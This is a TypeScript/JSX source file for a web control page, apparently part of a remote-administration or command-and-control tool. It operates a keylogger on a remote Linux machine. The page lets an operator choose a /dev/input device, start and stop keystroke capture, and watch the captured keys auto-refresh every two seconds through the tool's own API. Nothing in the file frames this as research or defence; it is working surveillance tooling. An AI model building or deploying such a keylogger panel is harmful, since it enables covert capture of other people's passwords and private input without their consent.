import { html } from "hono/html";

export function KeyloggerPage() {
  return (
    <div>
      {/* Controls */}
      <div class="bg-gray-900 rounded-xl p-6 border border-gray-800 mb-6">
        <div class="flex flex-wrap gap-3 items-end">
          <div>
            <label class="block text-sm text-gray-400 mb-1">Input Device</label>
            <select
              id="kl-device"
              class="bg-gray-800 border border-gray-700 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:border-blue-500"
            >
              <option value="">Loading devices...</option>
            </select>
          </div>
          <button
            onclick="startKeylogger()"
            id="kl-start-btn"
            class="bg-green-600 hover:bg-green-700 px-6 py-2.5 rounded-lg text-sm font-medium transition-colors"
          >
            Start
          </button>
          <button
            onclick="stopKeylogger()"
            id="kl-stop-btn"
            class="bg-red-600 hover:bg-red-700 px-6 py-2.5 rounded-lg text-sm font-medium transition-colors hidden"
          >
            Stop
          </button>
          <button
            onclick="refreshLog()"
            class="bg-gray-700 hover:bg-gray-600 px-6 py-2.5 rounded-lg text-sm font-medium transition-colors"
          >
            Refresh Log
          </button>
          <button
            onclick="clearLog()"
            class="bg-gray-700 hover:bg-gray-600 px-4 py-2.5 rounded-lg text-sm font-medium transition-colors"
          >
            Clear
          </button>
          <span id="kl-status" class="text-sm text-gray-400 ml-2"></span>
        </div>
        <p class="text-xs text-gray-600 mt-3">
          Note: The keylogger reads from /dev/input/ and may require root
          privileges on the server.
        </p>
      </div>

      {/* Key Log Output */}
      <div class="bg-gray-900 rounded-xl border border-gray-800">
        <div class="flex justify-between items-center p-6 pb-3">
          <h3 class="text-sm font-semibold text-gray-400 uppercase">
            Captured Keystrokes
          </h3>
          <label class="text-xs text-gray-500 flex items-center gap-2">
            <input
              type="checkbox"
              id="kl-auto"
              checked={true}
              onchange="toggleAutoRefresh()"
            />
            Auto-refresh
          </label>
        </div>
        <pre
          id="kl-log"
          class="px-6 pb-6 text-sm font-mono text-gray-300 max-h-[500px] overflow-auto whitespace-pre-wrap"
        >
          No data yet. Start the keylogger and press keys on the remote machine.
        </pre>
      </div>

      {html`<script>
        var autoRefreshInterval = null;

        async function loadDevices() {
          try {
            var data = await apiCall("/api/keylogger/devices");
            var select = document.getElementById("kl-device");
            if (data.success && data.devices.length > 0) {
              select.innerHTML = data.devices
                .map(function (d) {
                  return (
                    '<option value="' +
                    escapeHtml(d) +
                    '">' +
                    escapeHtml(d) +
                    "</option>"
                  );
                })
                .join("");
            } else {
              select.innerHTML = '<option value="">No devices found</option>';
            }
          } catch (e) {
            document.getElementById("kl-device").innerHTML =
              '<option value="/dev/input/event0">/dev/input/event0 (default)</option>';
          }
        }

        async function checkStatus() {
          try {
            var data = await apiCall("/api/keylogger/status");
            updateStatusUI(data.running);
          } catch (e) {}
        }

        function updateStatusUI(running) {
          var startBtn = document.getElementById("kl-start-btn");
          var stopBtn = document.getElementById("kl-stop-btn");
          var status = document.getElementById("kl-status");

          if (running) {
            startBtn.classList.add("hidden");
            stopBtn.classList.remove("hidden");
            status.innerHTML =
              '<span class="inline-block w-2 h-2 rounded-full bg-green-500 mr-1"></span> Running';
          } else {
            startBtn.classList.remove("hidden");
            stopBtn.classList.add("hidden");
            status.innerHTML =
              '<span class="inline-block w-2 h-2 rounded-full bg-gray-500 mr-1"></span> Stopped';
          }
        }

        async function startKeylogger() {
          var device = document.getElementById("kl-device").value;
          try {
            var data = await apiCall("/api/keylogger/start", {
              method: "POST",
              body: JSON.stringify({ device: device }),
            });
            if (data.success) {
              showNotification("Keylogger started", "success");
              updateStatusUI(true);
              toggleAutoRefresh();
            }
          } catch (e) {}
        }

        async function stopKeylogger() {
          try {
            var data = await apiCall("/api/keylogger/stop", { method: "POST" });
            if (data.success) {
              showNotification("Keylogger stopped", "success");
              updateStatusUI(false);
            }
          } catch (e) {}
        }

        async function refreshLog() {
          try {
            var data = await apiCall("/api/keylogger/log");
            var el = document.getElementById("kl-log");
            if (data.success) {
              el.textContent = data.log || "No keystrokes captured yet.";
              el.scrollTop = el.scrollHeight;
            }
          } catch (e) {}
        }

        async function clearLog() {
          try {
            await apiCall("/api/keylogger/clear", { method: "POST" });
            document.getElementById("kl-log").textContent = "Log cleared.";
            showNotification("Log cleared", "success");
          } catch (e) {}
        }

        function toggleAutoRefresh() {
          if (autoRefreshInterval) {
            clearInterval(autoRefreshInterval);
            autoRefreshInterval = null;
          }
          if (document.getElementById("kl-auto").checked) {
            autoRefreshInterval = setInterval(refreshLog, 2000);
          }
        }

        loadDevices();
        checkStatus();
        toggleAutoRefresh();
      </script>`}
    </div>
  );
}
